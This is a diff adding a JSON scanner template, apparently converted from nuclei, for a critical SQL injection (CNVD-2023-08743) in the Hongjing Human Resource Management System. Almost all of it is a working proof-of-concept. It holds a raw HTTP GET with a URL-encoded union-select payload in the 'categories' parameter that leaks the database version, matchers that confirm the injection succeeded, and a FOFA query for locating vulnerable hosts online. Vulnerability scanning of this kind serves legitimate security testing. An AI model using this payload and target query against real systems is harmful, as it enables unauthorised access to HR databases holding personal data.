@@ -1,0 +1,124 @@
+{
+  "id": "CNVD-2023-08743",
+  "name": "Hongjing Human Resource Management System - SQL Injection",
+  "author": "SleepingBag945",
+  "severity": "CRITICAL",
+  "description": "There is a SQL injection vulnerability in the categories of Hongjing Human Resource Management System, from which attackers can obtain sensitive database information.",
+  "references": [
+    "https://www.henry4e36.top/index.php/archives/162.html",
+    "https://blog.csdn.net/qq_41904294/article/details/130944159"
+  ],
+  "tags": [
+    "cnvd2023",
+    "cnvd",
+    "hongjing",
+    "hcm",
+    "sqli"
+  ],
+  "protocol": "http",
+  "selfContained": false,
+  "searchQueries": {
+    "fofa": "title\u003d\"人力资源信息管理系统\""
+  },
+  "variables": {},
+  "variablesType": "sniper",
+  "verifySteps": [
+    {
+      "stepId": "http_0",
+      "headers": {},
+      "followRedirect": false,
+      "timeout": 0,
+      "readSize": 0,
+      "raw": [
+        "GET /servlet/codesettree?flag\u003dc\u0026status\u003d1\u0026codesetid\u003d1\u0026parentid\u003d-1\u0026categories\u003d~31~27~20union~20all~20select~20~27hongjing~27~2c~40~40version~2d~2d HTTP/1.1\nHost: {{Hostname}}\n"
+      ],
+      "unsafe": false,
+      "disableCookie": false,
+      "disablePathAutomerge": false,
+      "cache": false,
+      "compressed": false,
+      "chunked": false,
+      "matchers": [
+        {
+          "type": "DSL",
+          "values": [
+            "status_code \u003d\u003d 200",
+            "contains(header,\"text/xml\")",
+            "contains_all(body,\"TreeNode id\u003d\\\"hongjing\",\"SQL Server\")"
+          ],
+          "negative": false,
+          "condition": "AND",
+          "index": 0,
+          "caseInsensitive": false,
+          "greedy": false,
+          "group": 0
+        }
+      ],
+      "matchersCondition": "OR",
+      "extractors": [],
+      "output": {},
+      "retries": 0,
+      "retryInterval": 0
+    }
+  ],
+  "exploitSteps": [],
+  "globalConfig": {
+    "maxRetries": 0,
+    "retryInterval": 0,
+    "globalHeaders": {},
+    "stopAtFirstMatch": false,
+    "threads": 0,
+    "cookieReuse": false,
+    "dnsConfig": {},
+    "authConfig": {}
+  },
+  "originalPoc": {
+    "id": "CNVD-2023-08743",
+    "info": {
+      "name": "Hongjing Human Resource Management System - SQL Injection",
+      "author": "SleepingBag945",
+      "severity": "critical",
+      "description": "There is a SQL injection vulnerability in the categories of Hongjing Human Resource Management System, from which attackers can obtain sensitive database information.",
+      "reference": [
+        "https://www.henry4e36.top/index.php/archives/162.html",
+        "https://blog.csdn.net/qq_41904294/article/details/130944159"
+      ],
+      "metadata": {
+        "max_request": 1,
+        "fofa_query": "title\u003d\"人力资源信息管理系统\""
+      },
+      "tags": "cnvd2023,cnvd,hongjing,hcm,sqli"
+    },
+    "self_contained": false,
+    "http": [
+      {
+        "global_matchers": false,
+        "cookie_reuse": false,
+        "disable_cookie": false,
+        "disable_path_automerge": false,
+        "threads": 0,
+        "redirects": false,
+        "skip_variables_check": false,
+        "stop_at_first_match": false,
+        "unsafe": false,
+        "read_all": false,
+        "iterate_all": false,
+        "raw": [
+          "GET /servlet/codesettree?flag\u003dc\u0026status\u003d1\u0026codesetid\u003d1\u0026parentid\u003d-1\u0026categories\u003d~31~27~20union~20all~20select~20~27hongjing~27~2c~40~40version~2d~2d HTTP/1.1\nHost: {{Hostname}}\n"
+        ],
+        "matchers": [
+          {
+            "type": "dsl",
+            "dsl": [
+              "status_code \u003d\u003d 200",
+              "contains(header,\"text/xml\")",
+              "contains_all(body,\"TreeNode id\u003d\\\"hongjing\",\"SQL Server\")"
+            ],
+            "condition": "and"
+          }
+        ]
+      }
+    ]
+  },
+  "originalFormat": "nuclei"
+}
